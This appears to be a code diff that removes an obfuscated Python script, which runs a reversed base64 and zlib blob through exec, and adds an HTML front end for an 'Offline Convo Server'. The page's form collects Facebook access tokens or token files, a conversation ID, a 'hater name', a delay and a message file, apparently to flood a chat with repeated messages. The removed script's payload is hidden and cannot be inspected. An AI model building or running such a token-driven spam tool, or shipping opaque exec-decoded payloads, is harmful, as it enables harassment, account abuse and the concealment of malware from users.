@@ -1,6 +1,186 @@
-# ENCODED BY ; TRICKER SEERAT RULEX BRAND 
-# Obfuscated with PyObfuscate
-# YOUTUBE ; https://www.youtube.com/@Trick-by-rulex-seerat-brand
-# FACEBOOK ; https://www.facebook.com/rulextrickerseeratbrand
-# -------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Offline Convo Server</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* CSS for styling elements */
+    label { color: white; }
+    .file { height: 30px; }
+    body {
+      background-image: url('https://i.ibb.co/4VZs4RZ/e528969e5cd9a5ceff1ac90085709ced.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+      color: white;
+    }
+    .container {
+      max-width: 350px;
+      height: auto;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+      border: none;
+      resize: none;
+    }
+    .form-control {
+      outline: 1px red;
+      border: 1px double white;
+      background: transparent;
+      width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      color: white;
+    }
+    .header { text-align: center; padding-bottom: 20px; }
+    .btn-submit { width: 100%; margin-top: 10px; }
+    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i { margin-right: 5px; }
+    button.stop-btn {
+            position: relative;
+            font-size: 1.2em;
+            padding: 0.7em 1.4em;
+            background-color: #BF0426;
+            text-decoration: none;
+            border: none;
+            border-radius: 0.5em;
+            color: #DEDEDE;
+            box-shadow: 0.5em 0.5em 0.5em rgba(0, 0, 0, 0.3);
+            cursor: pointer;
+        }
+
+        button.stop-btn::before {
+            position: absolute;
+            content: '';
+            height: 0;
+            width: 0;
+            top: 0;
+            left: 0;
+            background: linear-gradient(135deg, rgba(33,33,33,1) 0%, rgba(33,33,33,1) 50%, rgba(150,4,31,1) 50%, rgba(191,4,38,1) 60%);
+            border-radius: 0 0 0.5em 0;
+            box-shadow: 0.2em 0.2em 0.2em rgba(0, 0, 0, 0.3);
+            transition: 0.3s;
+        }
+
+        button.stop-btn:hover::before {
+            width: 1.6em;
+            height: 1.6em;
+        }
+
+        button.stop-btn:active {
+            box-shadow: 0.2em 0.2em 0.3em rgba(0, 0, 0, 0.3);
+            transform: translate(0.1em, 0.1em);
+        }
+        input[type="submit"] {
+            margin-top: 20px;
+            padding: 17px 40px;
+            border-radius: 50px;
+            cursor: pointer;
+            border: 0;
+            background-color: white;
+            box-shadow: rgb(0 0 0 / 5%) 0 0 8px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-size: 15px;
+            transition: all 0.5s ease;
+        }
+
+        input[type="submit"]:hover {
+            letter-spacing: 4px;
+            background-color: rgb(24, 191, 220);
+            color: hsl(0, 0%, 100%);
+            box-shadow: rgb(24, 191, 220) 0px 7px 29px 0px;
+        }
+
+        input[type="submit"]:active {
+            letter-spacing: 3px;
+            background-color: hsl(24, 191, 220);
+            color: hsl(0, 0%, 100%);
+            box-shadow: rgb(24, 191, 220) 0px 0px 0px 0px;
+            transform: translateY(10px);
+            transition: 100ms;
+        }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mt-3">𝗢𝗙𝗙𝗟𝗜𝗡𝗘 𝗖𝗢𝗡𝗩𝗢 𝗦𝗘𝗥𝗩𝗘𝗥 𝗪𝗜𝗧𝗛 𝗢𝗣𝗧𝗜𝗢𝗡𝗔𝗟 𝗠𝗢𝗗𝗘</h1>
+  </header>
+  <div class="container text-center">
+    <form action="/convo_server" method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">Enter Single Token</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Enter Your Hater Name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">Enter Time (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Choose Your Np File</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <input type="submit" value="Submit">
+    </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="stop-btn">Stop</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>© 2024 - 2025 Rajveer Convo Server. All Right Reserved By Rajveer.</p>
+    <p>[[ RAJVEER SINGHANIYA ]]<a href="https://www.facebook.com/RAJVEERSINGANIYA">RAJVEER SINGHANIYA HERE 󱢏 </a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+919971945685" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+      </a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
